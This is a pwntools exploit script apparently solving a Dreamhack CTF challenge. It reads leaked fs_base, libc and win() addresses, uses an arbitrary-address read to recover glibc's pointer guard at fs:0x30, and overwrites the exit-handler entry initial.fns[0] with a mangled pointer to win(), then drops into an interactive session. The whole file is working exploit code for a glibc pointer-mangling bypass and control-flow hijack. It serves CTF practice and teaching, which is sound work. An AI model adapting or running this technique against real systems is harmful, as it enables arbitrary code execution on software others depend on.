from pwn import *
import sys

p= remote('host3.dreamhack.games', 22447)

def rol(value, shift, width=64):
    return ((value << shift) | (value >> (width - shift))) & ((1 << width) - 1)


def ptr_mangle(ptr, ptr_guard):
    return rol((ptr ^ ptr_guard), 0x11)


# 1. get $fs_base, libc base, win() address
p.recvline()
fs_base = int(p.recvline().decode().split()[1], 16)
print(f'{fs_base =: #x}')

stdout_addr = int(p.recvline().decode().split()[1], 16)
stdout_off = 0x21b780
libc_base = stdout_addr - stdout_off
print(f'{libc_base =: #x}')

win_addr = int(p.recvline().decode().split()[1], 16)
print(f'{win_addr = : #x}')

# 2. read fs:0x30 with AAR
p.recvline()
p.sendlineafter(b': ', str(fs_base + 0x30).encode())
ptr_guard = int(p.recvline().decode().split()[1], 16)
p.recvline()
print(f'{ptr_guard = : #x}')

# 3. overwrite mangled win() address to initial.fns[0].func.at
p.recvline()
initial_fns = libc_base + 0x21bf18
p.sendlineafter(b': ', str(initial_fns).encode())
p.sendlineafter(b': ', str(ptr_mangle(win_addr, ptr_guard)).encode())

p.interactive()